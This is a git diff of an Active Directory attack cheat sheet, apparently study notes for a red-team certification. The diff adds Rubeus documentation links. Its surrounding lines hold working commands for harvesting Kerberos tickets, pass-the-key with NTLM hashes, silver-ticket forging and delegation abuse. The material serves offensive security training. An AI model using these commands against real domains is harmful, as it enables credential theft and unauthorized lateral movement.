@@ -496,6 +496,8 @@ Brute Password spray:
 * * *
 
 #### List tickets
+https://specterops.gitbook.io/ghostpack/rubeus/ticket-extraction-and-harvesting
+
 Get tickets currently on System:
 - All - ```Rubeus.exe harvest /interval:30 /runfor:300 /nowrap```
 - Specific User on Machine - ```rubeus.exe monitor /targetuser:Mary /interval:10 /nowrap```
@@ -516,6 +518,8 @@ Hash of a user:
 * * *
 
 #### Pass-the-key/Over-PTH
+https://specterops.gitbook.io/ghostpack/rubeus/ticket-requests-and-renewals
+
 Request ticket (TGT) based on username and password/hash:
 ```
 Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt
@@ -568,19 +572,19 @@ rubeus.exe silver /service:cifs/dc1.ecorp.local /rc4:64FBAE31CC352FC26AF97CBDEF1
 * * *
 
 #### Maintenance
+https://specterops.gitbook.io/ghostpack/rubeus/ticket-management
+
 Purge all kerberos tickets: ```rubeus.exe purge```
 
 View ticket: 
 ```rubeus.exe describe``` ```/ticket:doIFNDCCBTCg...bA==``` OR ```/ticket:stolen_users_club.kirbi```
 
-View active tickets by LUID:  
-```rubeus.exe triage```
-```rubeus.exe triage /luid:0x8f57c```
-
 We can purge by LUID also:
 ```rubeus.exe purge /luid:0x8f57c```
 
 #### S4U
+https://specterops.gitbook.io/ghostpack/rubeus/constrained-delegation-abuse
+
 Kerberos Delegation and S4U:
 - [Unconstrained S4U](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-unconstrained-delegation-attack-flow-with-spoolsample)
 - [Constrained S4U](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-s4u---constrained-delegation-user)
